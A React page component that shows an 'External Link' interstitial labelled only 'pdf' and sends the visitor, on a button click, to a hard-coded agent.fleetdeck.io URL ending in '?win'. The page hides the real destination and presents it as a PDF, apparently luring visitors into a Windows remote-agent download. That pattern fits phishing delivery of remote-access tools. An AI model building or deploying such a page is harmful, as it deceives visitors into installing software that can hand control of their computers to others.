import { FileText } from "lucide-react";

const DESTINATION_URL = "https://agent.fleetdeck.io/rp59P49dMNr6CLNX6zmjX?win";

const Index = () => {
  const handleContinue = () => {
    window.location.href = DESTINATION_URL;
  };

  return (
    <main className="min-h-screen flex flex-col items-center justify-center px-4 py-12 bg-background">
      <div className="flex flex-col items-center max-w-lg w-full text-center">
        <h1 className="text-2xl md:text-3xl font-semibold text-foreground mb-4">
          External Link
        </h1>

        <p className="text-muted-foreground mb-6">
          You are about to visit an external website:
        </p>

        <div className="w-full p-4 bg-muted rounded-lg mb-8 flex items-center justify-center gap-2">
          <FileText className="w-5 h-5 text-red-500" />
          <code className="text-sm text-foreground">pdf</code>
        </div>

        <button
          onClick={handleContinue}
          className="px-6 py-3 bg-primary text-primary-foreground rounded-lg font-medium hover:opacity-90 transition-opacity"
        >
          Continue to Site
        </button>

        <p className="text-xs text-muted-foreground mt-6">
          Click the button above to proceed to the external website.
        </p>
      </div>
    </main>
  );
};

export default Index;
